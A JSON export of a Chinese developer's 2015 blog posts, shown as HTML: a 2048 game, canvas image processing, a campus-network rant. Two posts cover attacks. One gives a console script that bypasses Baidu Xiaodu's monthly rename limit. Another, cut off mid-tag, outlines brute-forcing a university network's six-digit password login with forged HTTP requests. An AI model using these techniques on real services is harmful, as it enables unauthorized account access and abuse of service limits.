        "is_delete": false,
        "objectId": "p2DJJQfAqH",
        "stamps": "Github,2FA",
        "title": "开启2FA后, Github安卓客户端不能登录问题解决方法",
        "types": "b5e",
        "updatedAt": "2015-12-05T03:28:13.039Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 1.5em;\"\u003e那么接下来我们就来浅谈如何实现：\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e首先我们来说一下游戏的核心思想。\u003cspan style=\"color: rgb(192, 0, 0);\"\u003e这个游戏无非是创建一个 m*n 个元素的数组，然后捕获用户的键盘事件（上下左右）来控制或者说修改这个m*n的数组，然后在每次修改之后重新渲染这个数组，最终得到用户看到的游戏。\u003c/span\u003e（这是许多游戏的核心思想）\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e好，代码来了~~\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0016.gif\"/\u003e\u003c/p\u003e\u003cpre class=\"brush:html;toolbar:false\"\u003e\u0026lt;!DOCTYPE\u0026nbsp;html\u0026gt;\n\u0026lt;html\u0026gt;\n\u0026lt;head\u0026gt;\n\t\u0026lt;meta\u0026nbsp;charset=\u0026#39;UTF-8\u0026#39;/\u0026gt;\n\t\u0026lt;title\u0026gt;献给小汤圆的2048\u0026lt;/title\u0026gt;\n\t\u0026lt;link\u0026nbsp;rel=\u0026#39;stylesheet\u0026#39;\u0026nbsp;type=\u0026#39;text/css\u0026#39;\u0026nbsp;href=\u0026#39;css/index.css\u0026#39;\u0026nbsp;/\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n\u0026lt;div\u0026nbsp;style=\u0026#39;margin:20px;width:200px;\u0026#39;\u0026gt;\n\t\u0026lt;h5\u0026gt;大头，这是大锅原创的2048.你来当第一只小白鼠~~\\(^o^)/\u0026lt;/h5\u0026gt;\n\t\u0026lt;div\u0026nbsp;id=\u0026#39;container\u0026#39;\u0026gt;\u0026lt;/div\u0026gt;\n\t\u0026lt;div\u0026nbsp;id=\u0026#39;scores\u0026#39;\u0026gt;\n\t\t\u0026lt;p\u0026gt;你的分数:\u0026lt;/p\u0026gt;\n\t\t\u0026lt;p\u0026nbsp;class=\u0026#39;result\u0026#39;\u0026gt;0\u0026lt;/p\u0026gt;\n\t\u0026lt;/div\u0026gt;\n\u0026lt;div\u0026gt;\n\u0026lt;script\u0026nbsp;src=\u0026#39;js/jquery.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;script\u0026nbsp;src=\u0026#39;js/index.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\u003c/pre\u003e\u003cp style=\"line-height: 1.5em;\"\u003eHTML代码很简单，木有需要解释的，其中div#container就是游戏的容器。在这里我们引入一个jquery函数库便于我们开发。接下来我们看一下JS代码：\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e这里我们只列出了比较重要的属性与方法，全部代码请点击\u003ca href=\"http://www.oshjf.com/blog/iframe/2048/index.html\" target=\"_blank\" title=\"2048\"\u003e这个页面\u003c/a\u003e审查元素\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003efunction\u0026nbsp;M2048(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;this.arr\u0026nbsp;=\u0026nbsp;[];\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;this.divs\u0026nbsp;=\u0026nbsp;[];\n}\nM2048.prototype\u0026nbsp;=\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;initial\u0026nbsp;:\u0026nbsp;function(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//脚本入口，方法执行都放在这里\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;},\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;makeDivs\u0026nbsp;:\u0026nbsp;function(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//游戏初始化时往容器中添加div\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;},\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;randMake\u0026nbsp;:\u0026nbsp;function(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//随机生成俩个新的元素（即游戏开始时和每次上下左右后新出来的俩个元素）\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;},\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;render\u0026nbsp;:\u0026nbsp;function(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//渲染this.arr数组，得到最终用户视图\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;},\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;event\u0026nbsp;:\u0026nbsp;function(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//捕获用户键盘事件\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//使用this.dealArr方法修改控制this.arr数组\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}，\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;dealArr\u0026nbsp;:\u0026nbsp;function(\u0026nbsp;arr\u0026nbsp;){\t\t//核心部分\n/*\n\t这一部分我想了许久，要怎么才能解释清楚，我想就以向左为例吧。(只有这时我才知道语文没学好是多么后悔。。)\n\t向左时：看第一行\n\t先合并：\n\t\t从左往右遍历找不是0的元素\u0026nbsp;叫X\n\t\tX从右边找一个而且是第一个\u0026nbsp;不为0又与自己\u0026nbsp;相等的元素，那就把它kill（即变为0），并把自己等级加1。\n\t\t不管X有木有找到与它相同的元素。X都成功了，继续往后遍历（记住那个被kill的已经不在这个世界了）\n\t\t\t\n*/\t\t\n\t\t//合并\n\t\tfor(\u0026nbsp;var\u0026nbsp;i\u0026nbsp;=0;\u0026nbsp;i\u0026lt;arr.length;\u0026nbsp;i++\u0026nbsp;){\n\t\t\tif(\u0026nbsp;this.arr[arr[i]].rank\u0026nbsp;!==\u0026nbsp;0\u0026nbsp;){\n\t\t\t\tfor(var\u0026nbsp;j=i+1;\u0026nbsp;j\u0026nbsp;\u0026lt;arr.length;\u0026nbsp;j++\u0026nbsp;){\n\t\t\t\t\tif(\u0026nbsp;this.arr[arr[i]].rank\u0026nbsp;===\u0026nbsp;this.arr[arr[j]].rank\u0026nbsp;){\n\t\t\t\t\t\tthis.arr[arr[i]].rank\u0026nbsp;++;\n\t\t\t\t\t\tthis.arr[arr[j]].rank\u0026nbsp;=\u0026nbsp;0;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t//移位\n\t\tfor(\u0026nbsp;var\u0026nbsp;i=0;\u0026nbsp;i\u0026lt;arr.length;\u0026nbsp;i++\u0026nbsp;){\n\t\t\tif(\u0026nbsp;this.arr[arr[i]].rank\u0026nbsp;===\u0026nbsp;0\u0026nbsp;){\n\t\t\t\tfor(\u0026nbsp;var\u0026nbsp;j\u0026nbsp;=i+1;\u0026nbsp;j\u0026lt;arr.length;\u0026nbsp;j++\u0026nbsp;){\n\t\t\t\t\tif(\u0026nbsp;this.arr[arr[j]].rank\u0026nbsp;!==\u0026nbsp;0\u0026nbsp;){\n\t\t\t\t\t\tthis.arr[arr[i]].rank\u0026nbsp;=\u0026nbsp;this.arr[arr[j]].rank\u0026nbsp;+\u0026nbsp;0;\n\t\t\t\t\t\tthis.arr[arr[j]].rank\u0026nbsp;=\u0026nbsp;0;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\t\t\t\t\n\t\t\t}\n\t\t}\n\t},\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\n};\u003c/pre\u003e\u003cp\u003e其实，做一个游戏并不难，难的是如何创作游戏的创意与想法，这一点不仅我们国内开发者欠缺，而且我自己也不行。期待后来的开发者可以肩负这个重任，创作出有我们民族特色的游戏或者互联网产品\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0002.gif\"/\u003e\u003c/p\u003e",
        "createdAt": "2015-10-16T09:36:41.361Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-07-17T18:28:00.000Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;感谢Gabriele Cirulli先生的创意与智慧，因为这是我妹妹非常喜欢的一款小游戏，所以我决定自己开发一个，并且可以玩10x10方格的2048。先看demo：(要先点击一下，控制键:上下左右)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003ciframe src=\"http://www.oshjf.com/blog/iframe/2048/index.html\" width=\"280\" height=\"350\" scrolling=\"no\" frameborder=\"0\" align=\"\"\u003e\u003c/iframe\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003ca href=\"http://www.meajax.com/iframes/2048/index.html\" target=\"_blank\"\u003e\u0026nbsp;Quick Jump to Demo\u0026nbsp;\u003c/a\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e",
        "hasContent": true,
        "is_delete": false,
        "objectId": "r3P4YLFuKB",
        "stamps": "JS,游戏,2048\n",
        "title": "2048的快速实现(270行JS)\n",
        "types": "b1e,b13e",
        "updatedAt": "2015-12-05T05:08:00.221Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 1.5em;\"\u003e破解的方法还是比较简单的,先看代码吧..\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e只要修改代码中的prop.xiaoduName 与prop.userName 的值,然后在修改百小度名称的页面(也就是xiaodu.baidu.com)控制台注入这段代码就好了.记住必须这个页面哦,否则就是跨域请求,默认失败.\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e/*\n*\n*\t登陆自己的百度账号,进入百小度名称修改页面.\n*\t修改一次后,再修改提示不能修改,\n*\t打开控制台(按F12),注入这段代码,把\u0026nbsp;\u0026nbsp;xiaoduname\u0026nbsp;\u0026nbsp;和\u0026nbsp;userName\u0026nbsp;\u0026nbsp;换成你需要的.\n*\tOK\n*/\n\nvar\u0026nbsp;xmlhttp\u0026nbsp;=\u0026nbsp;new\u0026nbsp;XMLHttpRequest(),\n\tprop\u0026nbsp;=\u0026nbsp;{};\nprop.xiaoduName\u0026nbsp;=\u0026nbsp;\u0026#39;xiaodu\u0026#39;;\nprop.userName\u0026nbsp;=\u0026nbsp;\u0026#39;AJ\u0026#39;;\nprop.url\u0026nbsp;=\u0026nbsp;\u0026#39;http://xiaodu.baidu.com/s?sample_name=bear_brain\u0026#39;\u0026nbsp;+\n\t\t\t\u0026#39;\u0026amp;request_type=4\u0026amp;callback=jQuery110202043993091210723_1439446331525\u0026#39;\u0026nbsp;+\u0026nbsp;\n\t\t\t\u0026#39;\u0026amp;system_name=\u0026#39;\u0026nbsp;+\u0026nbsp;\n\t\t\tprop.xiaoduName\u0026nbsp;+\u0026nbsp;\u0026#39;\u0026amp;user_name=\u0026#39;+\n\t\t\tprop.userName\u0026nbsp;+\u0026nbsp;\u0026#39;\u0026amp;_=1439446331528\u0026#39;;\nprop.type\u0026nbsp;=\u0026nbsp;\u0026#39;GET\u0026#39;;\nprop.succes\u0026nbsp;=\u0026nbsp;function(val)\u0026nbsp;{\n\tconsole.log(val);\n}\nprop.error\u0026nbsp;=\u0026nbsp;function\u0026nbsp;()\u0026nbsp;{}\nxmlhttp.onreadystatechange\u0026nbsp;=\u0026nbsp;function\u0026nbsp;()\u0026nbsp;{\n\tif\u0026nbsp;(xmlhttp.status\u0026nbsp;===\u0026nbsp;200\u0026nbsp;\u0026amp;\u0026amp;\u0026nbsp;xmlhttp.readyState\u0026nbsp;===\u0026nbsp;4)\u0026nbsp;{\n\t\tprop.succes(xmlhttp.responseText);\n\t}\n}\nxmlhttp.open(prop.type,\u0026nbsp;prop.url);\nxmlhttp.send();\u003c/pre\u003e\u003cp style=\"line-height: 1.5em;\"\u003e说在后面:\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e个人觉得对于百度这样的大公司,是不应该出现这样的小错误的.因为,这种情况很容易避免的.比如我的数据表这样设计:is_modify 记录用户是否修改名称,last_modify_timestamp 上次修改名称的时间(用服务器端的时间),就基本可以解决小bug了.\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e我服务器知识稍弱,如果说的不对,欢迎留言批评哦...\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0042.gif\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cbr/\u003e\u003c/p\u003e",
        "createdAt": "2015-10-16T09:39:55.026Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-08-13T15:44:00.000Z"
        },
        "desc": "\u003cp style=\"line-height: 1.5em;\"\u003e最近百度在其首页中添加了一个\u0026quot;百小度\u0026quot;机器人,使用自然语言处理等技术能够与人很好地交流.这个功能还是不错的.而且百小度还可以修改名称,但是名称一个月只能修改一次,本着开发者的职业情节打开控制台看了一下XMLHttpRequest,居然有个小漏洞,先上图...\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150813/1439472921327299.gif\" title=\"1439472921327299.gif\" alt=\"GIF.gif\"/\u003e\u003c/p\u003e\n",
        "hasContent": true,
        "is_delete": false,
        "objectId": "rVqdwKeqUs",
        "stamps": "JS,XMLHttpRequest\n",
        "title": "百小度,一个月只能修改一次称呼,破解\n",
        "types": "b1e,b13e\n",
        "updatedAt": "2015-12-05T03:28:31.265Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "",
        "createdAt": "2015-10-29T14:29:06.844Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-10-29T14:29:06.432Z"
        },
        "desc": "\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(29, 27, 16);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;本来说今晚总结一下最近的seajs开发与angularjs开发经验, 无奈工大的网络上传一个几十K的文件到虚拟主机都慢的让\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px;\"\u003e(一)\u003c/span\u003e人\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px;\"\u003e(比)\u003c/span\u003e忧\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px;\"\u003e(吊)\u003c/span\u003e伤\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px;\"\u003e(糟).\u0026nbsp;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e我真的是XXX...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(29, 27, 16);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;哎╮(╯▽╰)╭,算了, 在工大的最后一年了. 过去的三年都挺过来了,其实工大也有让我怀念的东西, 那就是每天晚上回来路过枫叶飘飘的校园小路, 橘红的灯光与路边的小情侣相得益彰.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(29, 27, 16);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;.... 但即使这样, 网络也是要有的啊, 校长...\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(29, 27, 16);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;连不上Google, Github 10k/s的连接速度, 说好的互联网+呢 ?\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(29, 27, 16);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;老一辈就说过 : 穷也不能穷教育...\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0006.gif\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(29, 27, 16);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;好吧, 看来 Angularjs开发心得只能改天再写了, 今天也有点困了, 碎觉(～﹃～)~zZ\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; color: rgb(29, 27, 16);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;PPS : Angularjs 是一款很强大的前端框架, 成倍提高你开发的速度, 帮助你快速开发复杂的富web应用, 这是我最近开发一个Chrome词典插件总结的.\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(29, 27, 16);\"\u003e感谢Google 的工程师们\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0002.gif\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151029/1446128928566814.png\" title=\"1446128928566814.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e",
        "hasContent": false,
        "is_delete": false,
        "objectId": "rVzRMlGtmb",
        "stamps": "我勒个去",
        "title": "吐槽之工大的网络",
        "types": "b6e,b5e",
        "updatedAt": "2015-12-05T03:28:21.583Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"white-space: normal; line-height: 1.5em;\"\u003eHTML5的canvas提供了俩个灰常强大的方法getImageData与putImageData\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003evar\u0026nbsp;canvas\u0026nbsp;=\u0026nbsp;document.getElementById(\u0026#39;canvas\u0026#39;),\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;ctx\u0026nbsp;=\u0026nbsp;canvas.getContext(\u0026#39;2d\u0026#39;),\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;arr\u0026nbsp;=\u0026nbsp;[];\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;保存图像像素信息的数组\narr\u0026nbsp;=\u0026nbsp;ctx.getImageData(\u0026nbsp;0,\u0026nbsp;0,\u0026nbsp;200,\u0026nbsp;200);\u0026nbsp;//四个参数分别对应\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//起点横坐标，起点纵坐标，宽度，高度\n//\u0026nbsp;arr[0]\u0026nbsp;=\u0026nbsp;第一个像素的r值\n//\u0026nbsp;arr[1]\u0026nbsp;=\u0026nbsp;第一个像素的g值\n//\u0026nbsp;arr[2]\u0026nbsp;=\u0026nbsp;第一个像素的b值\n//\u0026nbsp;arr[3]\u0026nbsp;=\u0026nbsp;第一个像素的a值(a表示不透明度)\n//\u0026nbsp;arr[4]\u0026nbsp;=\u0026nbsp;第二个像素的r值\n//\u0026nbsp;...以此类推\u003c/pre\u003e\u003cp style=\"white-space: normal; line-height: 1.5em;\"\u003e然后我们就阔以修改数组arr中的任意一个值，也就是说明我们阔以操作一个图像中的任意一个像素的r,g,b,a值。你想做什么都阔以了！\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0007.gif\" width=\"34\" height=\"31\" style=\"width: 34px; height: 31px;\"/\u003e(但是web性能稍弱是一个硬伤)\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 1.5em;\"\u003e可是仅仅操作了arr中的数据，并不是对图像的修改就直接生效了，我们还需要另一个牛x的方法putImageData,这个方法会把图像的数据渲染成最终的图像。\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003ectx.putImageData(\u0026nbsp;arr,\u0026nbsp;0,\u0026nbsp;0\u0026nbsp;);\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//三个参数分别是图像数据,绘制起点横坐标，纵坐标\u003c/pre\u003e\u003cp style=\"white-space: normal; line-height: 1.5em;\"\u003e其实我们能做的图像处理还有许多，比如做出移轴效果等等，在以后的教程中会出。有创意的同学也阔以拿出来与大家分享分享哈。\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e",
        "createdAt": "2015-10-16T09:30:51.881Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-07-23T16:29:00.000Z"
        },
        "desc": "\u003cp style=\"white-space: normal;\"\u003e使用HTML5技术做图形处理（\u003cspan style=\"font-family: \u0026#39; Microsoft\n                                                       YaHei\u0026#39;; font-size: 13px;\"\u003eDigital Image Processing\u003c/span\u003e），是不是很酷？\n\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0003.gif\"/\u003e\u003c/p\u003e\u003cp style=\"white-space: normal;\"\u003e本教程只介绍\u003cstrong\u003e\u003cspan\n        style=\"color: rgb(31, 73, 125);\"\u003e直方图均衡化\u003c/span\u003e\u003c/strong\u003e和\u003cspan style=\"color: rgb(31, 73, 125);\"\u003e\n\u003cstrong\u003e图像分割\u003c/strong\u003e\u003c/span\u003e俩种处理图像的方法。其中\u003cspan style=\"color: rgb(31, 73, 125);\"\u003e\u003cstrong\u003e图像分割\u003c/strong\u003e\u003c/span\u003e介绍俩种方法\n\u003cstrong\u003e二值化\u003c/strong\u003e\u003cspan style=\"color: rgb(31, 73, 125);\"\u003e\u003c/span\u003e与\u003cstrong\u003e大津阈值法\u003c/strong\u003e\u003c/p\u003e\u003cp style=\"white-space:\n                                                                                                  normal;\"\u003e\u003ca\n        href=\"http://www.oshjf.com/blog/iframe/dip/index.html\" target=\"_blank\"\u003e\u003cspan style=\"color: rgb(0, 0,\n    0);\"\u003e点击这里查看完整demo\u003c/span\u003e\u003c/a\u003e\u003c/p\u003e\u003cp style=\"white-space: normal;\"\u003e\u003ca\n        href=\"https://github.com/AJLoveChina/DigitalImageProcessing\" target=\"_blank\"\u003eGithub地址\u003c/a\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp\n        style=\"white-space: normal;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150723/1437660507115454.png\"\n                                            title=\"1437660507115454.png\" alt=\"blob.png\" width=\"404\" height=\"217\"\n                                            style=\"width: 404px; height: 217px;\"/\u003e\u003c/p\u003e\u003cp style=\"white-space:\n                                                                                           normal;\"\u003e\u003cimg\n        src=\"/ueditor/php/upload/image/20150723/1437660558139887.png\" title=\"1437660558139887.png\" alt=\"blob.png\"\n        width=\"276\" height=\"313\" style=\"width: 276px; height: 313px;\"/\u003e\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e",
        "hasContent": true,
        "is_delete": false,
        "objectId": "rtUqct6Hrd",
        "stamps": "canvas,图像处理，大津阈值法,图像分割,二值化",
        "title": "图像处理（使用Js操作canvas）",
        "types": "b1e,b13e",
        "updatedAt": "2015-12-05T03:28:44.338Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 1.5em;\"\u003e首先,这个实验是对合工大校园网的破解,也就是如果你自己在学习使用的时候,要结合自己学校的情况修改代码,但只要思想懂了你肯定会修改.\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e简单的说一下大概怎么做(建议使用Chrome浏览器,因为其Network面板功能强大):\u003c/p\u003e\u003col class=\" list-paddingleft-2\" style=\"list-style-type: decimal;\"\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e首先登陆自己的校园网账号,看一下登陆的真实http请求是怎么样的\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e如果校园网只是简单的认证用户名与密码是否匹配,就有破解的可能.如何知道呢?查看它发送的字段与字段的值(后面有说明)\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e尝试伪造http请求,分别获取成功与失败时服务端返回的数据,并根据这个数据,在我们的代码中判断一个\u0026nbsp;\u003cem\u003e用户名与密码\u0026nbsp;\u003c/em\u003e的尝试 是否匹配,如果匹配则记录(本例使用nodejs).然后不管是否匹配,继续下一个\u0026nbsp;\u003cem\u003e用户名与密码\u0026nbsp;\u003c/em\u003e的尝试.\u003c/p\u003e\u003c/li\u003e\u003c/ol\u003e\u003chr/\u003e\u003cp style=\"line-height: 1.5em;\"\u003e我们首先看真实的登陆场景.\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 24px;\"\u003e因为登陆过程不需要验证码,而且密码是六位数字,所以我就想很大可能有漏洞.然后我们看一下真实登陆的过程后面隐藏着什么..\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150829/1440847346132253.png\" title=\"1440847346132253.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150829/1440847590707614.png\" title=\"1440847590707614.png\" alt=\"blob.png\" width=\"400\" height=\"360\" style=\"width: 400px; height: 360px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e从登陆的http请求来看,看来只是简单的把用户名与密码传给服务器,(0MKKey字段是木有作用的,至少对于用户验证来说).\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e从请求的字段上来看,服务端并没有与客户端进行类似非对称密钥的用户验证.好吧,其实很多学校的网站都是外包给外满公司做的,而外包的质量.....\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e那么如何破解呢?\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e我们假设:现在我的学号是20121234, 密码是:123.\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e我们先用这个登陆, 查看服务端返回什么内容(如图):\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e服务端返回HTML..\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150829/1440851308646595.png\" title=\"1440851308646595.png\" alt=\"blob.png\" width=\"415\" height=\"260\" style=\"width: 415px; height: 260px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e我们在用相同的学号,换个456密码看看服务端返回什么:\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003eWhat the f... 还是HTML...\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150829/1440851411677492.png\" 